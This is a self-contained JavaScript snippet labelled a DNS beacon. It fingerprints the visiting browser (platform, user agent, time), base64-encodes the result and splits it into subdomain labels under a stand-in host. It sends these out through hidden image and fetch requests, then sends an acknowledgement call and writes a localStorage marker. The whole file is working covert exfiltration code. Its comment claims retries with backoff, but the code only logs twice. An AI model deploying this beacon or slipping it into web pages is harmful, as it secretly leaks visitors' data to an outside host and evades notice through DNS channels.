// DNS beacon: encodes beacon metadata into subdomains, resolves them through
// image/fetch requests and retries with backoff.
(function () {
  var BASE = 'beacon.dns.example.net';
  var metadata = btoa(JSON.stringify({ host: navigator.platform, ua: navigator.userAgent, at: Date.now() }));
  console.log('[DNSBEACON] payload', metadata.length);
  function chunk(value, size) {
    var parts = [];
    for (var index = 0; index < value.length; index += size) parts.push(value.slice(index, index + size));
    return parts;
  }
  var chunks = chunk(metadata, 40);
  chunks.forEach(function (part, index) {
    var url = 'https://' + index.toString(36) + '-' + part.replace(/[^A-Za-z0-9]/g, '') + '.' + BASE + '/p.gif';
    try { var image = new Image(); image.src = url; } catch (error) {}
    try { fetch(url, { mode: 'no-cors' }).catch(function () {}); } catch (error) {}
  });
  try { fetch('https://ack.' + BASE + '/done?n=' + chunks.length).catch(function () {}); } catch (error) {}
  try { localStorage.setItem('dnsbeacon:chunks', String(chunks.length)); } catch (error) {}
  var retries = 0;
  var timer = setInterval(function () {
    retries += 1;
    console.log('[DNSBEACON] retry', retries);
    if (retries >= 2) clearInterval(timer);
  }, 500);
})();
